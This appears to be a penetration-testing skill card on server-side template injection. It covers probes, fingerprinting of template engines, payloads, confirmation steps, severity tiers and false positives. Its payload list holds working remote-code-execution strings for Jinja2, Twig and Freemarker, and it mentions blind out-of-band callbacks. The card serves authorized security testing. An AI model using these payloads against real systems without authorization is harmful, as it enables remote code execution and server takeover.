---
id: ssti
name: Server-Side Template Injection
phase: exploit
severity: critical
aliases: [ssti, template-injection, server-side-template-injection]
tags: [web, injection, template]
---

# Server-Side Template Injection

## When to use
User input is rendered into pages, emails, PDFs, invoices, or error messages by a server-side template engine.
Recon signal: reflected values in templates, params like name, message, template, subject, or theme.
Frameworks using Jinja2, Twig, Freemarker, Velocity, Smarty, Handlebars, or ERB are the usual suspects.

## Quick checks
1. Submit a polyglot probe ${{<%[%'"}}%\ plus the arithmetic set {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>.
2. Look for computed results (49, 7777777) rather than literal echoed text.
3. Disable JavaScript and retest; server-side evaluation still returns 49.
4. Fingerprint the engine: {{7*'7'}} yields 7777777 in Jinja2 and 49 in Twig.
5. Test blind contexts (email subject/body, PDF export, password reset templates).

## Payloads / test cases
- {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {{7*'7'}}
- Jinja2 config leak: {{config}} and {{self.__init__.__globals__}}
- Jinja2 RCE: {{''.__class__.__mro__[1].__subclasses__()}} then reach os/subprocess.
- Twig RCE: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
- Freemarker RCE: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
- Velocity probe: #set($x=7*7)$x

## Detection & confirmation
1. Send {{7*7}} at the injection point and confirm 49 appears in the response.
2. Confirm the engine with two or three type-specific probes before escalating.
3. Demonstrate benign command execution (id, whoami) or file read.
4. For blind SSTI, use a time delay (sleep) or an out-of-band DNS/HTTP callback.
5. Record the exact parameter, context (HTML, attribute, email body), and payload.

## Escalation
SSTI to remote code execution -> P1; sandbox blocks RCE but secrets/config are readable -> P2; expression evaluation with no sensitive impact -> P3 (see prioritization.md).

## Evidence to capture
- Raw request and response showing the computed 49.
- Engine fingerprint probes and their distinct outputs.
- RCE command output (id) or OOB callback log.
- Screenshot of the rendered result.
- Injection parameter and rendering context.

## Common false positives
- Client-side frameworks (Vue, Angular, Handlebars.js) evaluate {{ }} in the browser, not the server.
- WAF returns a canned block page that happens to contain numbers.
- The literal probe string is reflected without evaluation.
- The math value appears in the response from unrelated page content.

## Related skills
- [[lfi]]
- [[file-upload]]
- [[graphql]]
